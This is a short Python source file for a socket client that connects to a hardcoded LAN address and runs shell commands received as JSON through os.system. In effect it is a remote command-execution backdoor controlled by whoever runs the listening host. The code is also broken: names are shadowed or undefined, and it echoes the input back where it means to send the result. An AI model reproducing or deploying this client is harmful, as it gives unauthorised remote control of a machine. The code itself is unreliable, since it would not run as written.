import os, socket, threading, json
from dataHandler import data

class client:
	def __init__(self,ip,port):
		self.ip = ip
		self.port = port
		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.s.connect((self.ip, self.port))
		threading.Thread(target=self.receiver).start()

	def data_handler(self,data):
		d = data()
		ProcessedData = d.process(data)
		if ProcessedData is True:
			if data["type"] == "check":
				return True
			elif data["type"] == "os_system":
				return os.system(data[cmd])

	def receiver(self):
		print("receiver started")
		while True:
			r_data = self.s.recv(1024)
			if r_data != b'':
				r_data = json.loads(r_data)
				s_data = self.data_handler(r_data)
				s_data = json.dumps(s_data)
				s.send(r_data)

if __name__ == "__main__":
	cl = client("192.168.1.231",7777)